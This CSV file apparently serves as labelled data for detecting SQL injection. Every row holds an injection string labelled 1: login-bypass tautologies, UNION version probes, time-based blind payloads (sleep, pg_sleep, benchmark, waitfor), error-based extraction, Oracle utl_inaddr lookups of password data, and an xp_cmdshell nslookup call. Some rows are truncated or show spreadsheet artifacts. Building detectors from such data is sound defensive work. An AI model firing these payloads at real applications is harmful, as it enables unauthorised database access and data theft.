Sentence,Label,EtiqManual
"insert into users  (  login, password, level  )   values  (   char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )   + char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )  ,char  (  0x64  )  ",1,0
" select * from users where id  =  1 or ""  )    (  ""  =  1 or 1  =  1 -- 1",1,0
"admin"" or ""1""  =  ""1""#",1,0
"admin"" or 1  =  1--",1,0
 or user like '%,1,0
admin'  )   or '1'  =  '1,1,0
""" or sleep  (  __TIME__  )  #",1,0
select * from users where id  =  '1' + $+%$ or 1  =  1 -- 1',1,0
 or ''-',1,0
admin'  )   or '1'  =  '1'/*,1,0
x' or 1  =  1 or 'x'  =  'y,1,0
  )   or   (  'x'  )    =    (  'x,1,0
 ( ,1,0
" select * from users where id  =  1 or 1#""  (   union select version  (    )  ,version  (    )   -- 1",1,0
" select * from users where id  =  1.%@ union select 1,version  (    )   -- 1",1,0
" select * from users where id  =  1 +$+ union select null,@@VERSION -- 1",1,0
" select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",1,0
" select * from users where id  =  1 +1<@ union select null,version  (    )   -- 1",1,0
 )    )    or sleep  (  __TIME__  )    =  ',1,0
having 1  =  1--,1,0
select * from users where id  =  1 or $ 1  =  1 or 1  =  1 -- 1,1,0
 group by userid having 1  =  1--,1,0
" select * from users where id  =  '1' or @ 1  =  1 union select 1,version  (    )   -- 1'",1,0
" select * from users where id  =  1 or 1#""; union select 1,version  (    )   -- 1",1,0
 or 0  =  0 #,1,0
or pg_sleep  (  __TIME__  )  --,1,0
or '1'  =  '1'--,1,0
" select * from users where id  =  1 or 1#""1 union select 'a',version  (    )   -- 1",1,0
" select * from users where id  =  1 or 1#"".  =  1 union select 1,version  (    )   -- 1",1,0
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  USERNAME   )    )    FROM SYS.ALL_USERS   )    )    AND 'i'  =  'i,1,0
" select * from users where id  =  1 or 1#""; union select 'a',version  (    )   -- 1",1,0
0x730065006c0065006300740020004000400076006500 ...,1,0
" select * from users where id  =  1 union select 1 1$,version  (    )   -- 1",1,0
" select * from users where id  =  1. <@ union select version  (    )  ,version  (    )   -- 1",1,0
declare @s varchar   (  8000  )   select @s   =   0x73656c65637420404076657273696f6e,1,0
select * from users where id  =  '1' or \<$ or 1  =  1 -- 1',1,0
 or ''&',1,0
" select * from users where id  =  '1' union select \.%1,@@VERSION -- 1'",1,0
 or username like char  (  37  )  ,1,0
or 'something'   =   'some'+'thing',1,0
#NAME?,1,0
or 1 in   (  select @@version  )  --,1,0
declare @q nvarchar   (  4000  )   select @q   = ,1,0
" select * from users where id  =  1.&&@ union select 1,version  (    )   -- 1",1,0
" select * from users where id  =  1 + @<@# union select null,version  (    )   -- 1",1,0
" select * from users where id  =  1 +1<@ union select version  (    )  ,version  (    )   -- 1",1,0
" select * from users where id  =  1 union select 1a,banner from v$version where rownum  =  1 -- 1",1,0
" select * from users where id  =  1 + @<1# union select 1,version  (    )   -- 1",1,0
admin'  )   or   (  '1'  =  '1'#,1,0
or a   =   a,1,0
select * from users where id  =  '1' or !<@ or 1  =  1 -- 1',1,0
 or '1'  =  '1',1,0
declare @q nvarchar   (  200  )   0x730065006c00650063007400200040004000760065007200730069006f006e00 exec  (  @q  ) ,1,0
"admin"" #",1,0
select * from users where id  =  1 %  (  1  )   or 1  =  1 -- 1,1,0
" select * from users where id  =  '1' or \<   =  1 union select 1,@@VERSION -- 1'",1,0
" select * from users where id  =  1 or @#""  (    =  1 or 1  =  1 -- 1",1,0
 begin declare @var varchar  (  8000  )   set @var  =  ' ...,1,0
 )   or pg_sleep  (  __TIME__  )  --,1,0
PRINT @@variable,1,0
" select * from users where id  =  1 or @#"".  =  1 or 1  =  1 -- 1",1,0
or a  =  a--,1,0
a' or 1  =  1,1,0
select * from users where id  =  1 %  (  \  )   or 1  =  1 -- 1,1,0
%2A%28%7C%28mail%3D%2A%29%29,1,0
 having 1  =  1--,1,0
"admin""  )   or ""1""  =  ""1""#",1,0
" select * from users where id  =  1 or 1#""1 union select null,version  (    )   -- 1",1,0
" select * from users where id  =  '1' union select 1,banner from v$version where rownum  =  1 -- 1'",1,0
"""  )   or   (  ""x""  )    =    (  ""x",1,0
" select * from users where id  =  1 or ""@;""  =  1 or 1  =  1 -- 1",1,0
" select * from users where id  =  '1' or @  (  1  )    =  1 union select 1,version  (    )   -- 1'",1,0
select * from users where id  =  '1' <@&@ or 1  =  1 -- 1',1,0
 or username like '%,1,0
"||  (  elt  (  -3+5,bin  (  15  )  ,ord  (  10  )  ,hex  (  char  (  45   )    )      )    )   ",1,0
 or uname like '%,1,0
declare @s varchar  (  200  )   select @s   =   0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,1,0
 or 1 --',1,0
" select * from users where id  =  1 +   (  $+  )   union select null,@@VERSION -- 1",1,0
select * from users where id  =  1 %$ . or 1  =  1 -- 1,1,0
"admin""  )   or ""1""  =  ""1""--",1,0
1   )    )    or sleep  (  __TIME__  )  #,1,0
 (  sqlattempt2  ) ,1,0
" select * from users where id  =  '1' *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1'",1,0
"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",1,0
@var select @var as var into temp end --,1,0
 or ''  =  ',1,0
" select * from users where id  =  1 or "",&"" or 1  =  1 -- 1",1,0
" select * from users where id  =  '1' union select "";""_,version  (    )   -- 1'",1,0
"""&""",1,0
"""   )    )   ;waitfor delay '0:0:__TIME__'--",1,0
",s",1,0
select * from users where id  =  1 +  (  \  )   or 1  =  1 -- 1,1,0
" select * from users where id  =  1 + @`\` union select 1,version  (    )   -- 1",1,0
 UNION ALL SELECT,1,0
" select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",1,0
" select * from users where id  =  1 or "";&"" or 1  =  1 -- 1",1,0
select * from users where id  =  '1' or \<1 or 1  =  1 -- 1',1,0
" select * from users where id  =  '1' +   (  \  )   union select 1,@@VERSION -- 1'",1,0
t'exec master..xp_cmdshell 'nslookup www.googl ...,1,0
"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1,0
" select * from users where id  =  1 or $ 1  =  1 union select 1,@@VERSION -- 1",1,0
or,1,0
select,1,0
""" or 1  =  1--",1,0
a' or 'a'   =   'a,1,0
" select * from users where id  =  1 or @#""  (    =  1 union select 1,version  (    )   -- 1",1,0
"admin""  )   or   (  ""1""  =  ""1""/*",1,0
" select * from users where id  =  '1' union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1'",1,0
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  GRANTED_ROLE   )    )    FROM DBA_ROLE_PRIVS WHERE GRANTEE  =  SYS.LOGIN_USER   )    )    AND 'i'  =  'i,1,0
" select * from users where id  =  1 or 1#""  (   union select null,version  (    )   -- 1",1,0
" union   (  select NULL, NULL, NULL,    (  select @@version   )    )    --",1,0
" select * from users where id  =  1 union select @ $$,version  (    )   -- 1",1,0
or 1  =  1 /*,1,0
"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",1,0
"admin""  )   or ""1""  =  ""1""/*",1,0
 or 'text' > 't',1,0
"benchmark  (  10000000,MD5  (  1   )    )   #",1,0
hi' or 'a'  =  'a,1,0
sqlattempt1,1,0
admin' or 1  =  1--,1,0
1' or '1'  =  '1,1,0
" select * from users where id  =  '1' *1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,0
",@variable",1,0
%2A%7C,1,0
*  (  |  (  mail  =  *   )    ) ,1,0
" select * from users where id  =  1 or 1#""1 union select version  (    )  ,version  (    )   -- 1",1,0
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  PASSWORD   )    )    FROM SYS.USER$   )    )    AND 'i'  =  'i,1,0
" select * from users where id  =  '1' or   (  \  )    =  1 union select 1,@@VERSION -- 1'",1,0
order by,1,0
select * from users where id  =  1 or !<@ or 1  =  1 -- 1,1,0
 or username is not NULL or username   =   ',1,0
admin' or '1'  =  '1'/*,1,0
//*,1,0
" select * from users where id  =  1  <@. union select version  (    )  ,version  (    )   -- 1",1,0
" select * from users where id  =  1 or "";  )  ""  =  1 or 1  =  1 -- 1",1,0
" select * from users where id  =  '1' +   (  \.  )   union select 1,@@VERSION -- 1'",1,0
"<>""'%;  )    (  &+",1,0
 and 1  =  0  )   union all,1,0
 or a  =  a--,1,0
0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A,1,0
" select * from users where id  =  1 union select 1 $$,version  (    )   -- 1",1,0
" select * from users where id  =  1 or   (  1  )    =  1 union select 1,banner from v$version where rownum  =  1 -- 1",1,0
 (  sqlvuln  ) ,1,0
 or 'text'   =   n'text',1,0
 or '1'  =  '1'--,1,0
0x730065006c00650063007400200040004000760065007200730069006f006e00 exec  (  @q  ) ,1,0
" select * from users where id  =  1 or ""1;""  =  1 or 1  =  1 -- 1",1,0
1 exec sp_   (  or exec xp_  ) ,1,0
" select * from users where id  =  '1' or   (  1  )    =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,0
admin' --,1,0
 (  select top 1,1,0
having,1,0
"   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",1,0
" select * from users where id  =  1 or ""\#"" or 1  =  1 -- 1",1,0
 or '7659'  =  '7659,1,0
" select * from users where id  =  1 or 1#""; union select version  (    )  ,version  (    )   -- 1",1,0
" select * from users where id  =  1 or @`\` union select 1,version  (    )   -- 1",1,0
" select * from users where id  =  1 -@<@ union select null,version  (    )   -- 1",1,0
" select * from users where id  =  1 union select 1a#,banner from v$version where rownum  =  1 -- 1",1,0
"""^""",1,0
*  (  |  (  objectclass  =  *   )    ) ,1,0
limit,1,0
or 1  =  1#,1,0
*|,1,0
create user name identified by 'pass123',1,0
" select * from users where id  =  1.*\ union select null,@@VERSION -- 1",1,0
.s,1,0
|,1,0
" select * from users where id  =  1 union select @&&@,version  (    )   -- 1",1,0
" or benchmark  (  10000000,MD5  (  1   )    )   #",1,0
 or sleep  (  __TIME__  )    =  ',1,0
# from wapiti,1,0
""" or sleep  (  __TIME__  )    =  """,1,0
sleep  (  __TIME__  )  #,1,0
  )   or pg_sleep  (  __TIME__  )  --,1,0
   )    )    or sleep  (  __TIME__  )    =  ',1,0
 or sleep  (  __TIME__  )  #,1,0
 or pg_sleep  (  __TIME__  )  --,1,0
   )    )    or pg_sleep  (  __TIME__  )  --,1,0
  )   or sleep  (  __TIME__  )    =  ',1,0
   )    )   ,1,0
"1'   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,0
"1  )   as clye where 7842  =  7842 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,0
"-4860'  )   as azyx where 6901  =  6901 union all select 6901,6901,6901,6901,6901#",1,0
"1%'   )    )    union all select null,null,null,null,null#",1,0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",1,0
1  )   as boed where 6787  =  6787,1,0
"1""   )    )    as vdbf where 7969  =  7969 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1,0
"1"" where 4281  =  4281",1,0
"1%""  )   and 8024  =  3560--",1,0
"1""  )   and   (  5452  =  6050  )  *6050 and   (  ""ciyc"" like ""ciyc",1,0
"1""   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,0
"1',  (  select   (  case when   (  9443  =  9443  )   then sleep  (  5  )   else 9443*  (  select 9443 from information_schema.character_sets  )   end   )    )   ",1,0
"1'||  (  select 'rawn' from dual where 4988  =  4988 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   ||'",1,0
"-4925"" union all select 5686,5686,5686,5686,5686,5686,5686#",1,0
"1""   )    )    as dnhd where 2657  =  2657 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1,0
-9534%' or 3038  =  3038,1,0
"1'  )   where 6941  =  6941 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1,0
select   (  case when   (  7978  =  6009  )   then 7978 else 1/  (  select 0  )   end  )  --,1,0
"-1212%'  )   or make_set  (  7588  =  2306,2306  )   and   (  '%'  =  '",1,0
"1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,0
"-3794'  )   union all select 2485,2485,2485,2485,2485--",1,0
"1'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'gmil'  =  'gmil",1,0
"1' and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,0
"-6400   )    )    union all select 4650,4650,4650--",1,0
"1'||  (  select 'rttq' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",1,0
"1""  )   as ztkr where 1532  =  1532",1,0
"1'  )   where 9842  =  9842 union all select null,null,null,null,null,null,null,null#",1,0
"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'fbsi' like 'fbsi",1,0
"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and 'uwep'  =  'uwep",1,0
"-4291""   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""xyhi""  =  ""xyhi",1,0
"1' in boolean mode  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  #",1,0
"1%"" or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""pawh""  =  ""pawh",1,0
 (  1589  =  1589  )  *1,1,0
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   7240  =  7240",1,0
1   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  9548  =  9548,1,0
1   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   6406  =  6406,1,0
-5021'+  (  select yadq where 4285  =  4285 order by 1#,1,0
1%' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and '%'  =  ',1,0
"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""baia""  =  ""baia",1,0
"1""  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  ""jozh""  =  ""jozh",1,0
"-9508  )   union all select 9950,9950,9950,9950,9950,9950,9950#",1,0
"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,0
"-1064' or make_set  (  6439  =  2937,2937  )   and 'qojd'  =  'qojd",1,0
1'  )   as rbpx where 1264  =  1264,1,0
"1%'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  '%'  =  '",1,0
if  (  8284  =  6171  )   select 8284 else drop function mbih--,1,0
1   )    )    or sleep  (  5  )  #,1,0
"-7868""   )    )    or 9323  =  9323#",1,0
"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",1,0
"1"" where 2462  =  2462 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'mfib'  =  'mfib",1,0
1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,0
1%' and 4595  =  4595#,1,0
"1  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  8929  =  8929",1,0
-7999  )   or 8422  =  1336,1,0
-5742' where 1314  =  1314 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1,0
"1   )    )    as potk where 5040  =  5040 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,0
"-4605""  )   union all select 8542,8542,8542,8542,8542,8542,8542,8542--",1,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  'njnr'  =  'njnr",1,0
